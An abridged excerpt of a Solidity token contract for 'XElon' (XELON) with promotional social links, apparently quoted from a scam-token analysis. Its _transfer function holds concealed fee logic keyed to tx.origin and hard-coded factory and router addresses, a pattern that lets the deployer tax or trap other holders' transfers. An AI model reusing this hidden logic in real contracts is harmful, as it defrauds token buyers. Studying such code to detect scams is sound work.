...
https://twitter.com/XelonTokenBNB
https://t.me.com/XelonTokenBNB
https://XelonTokenBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factoryV2 = 0x5043d61796616A47D4Ac75CC540f1b1985e48449;
    address internal router = 0x5957dD8514768750e994E9e5Ab8CD819cE7b28db;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[_factoryV2] > 0 ? pairsToken : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract XelonToken is ERC20, Ownable {
    constructor() ERC20(unicode"XElon", unicode"XELON") {
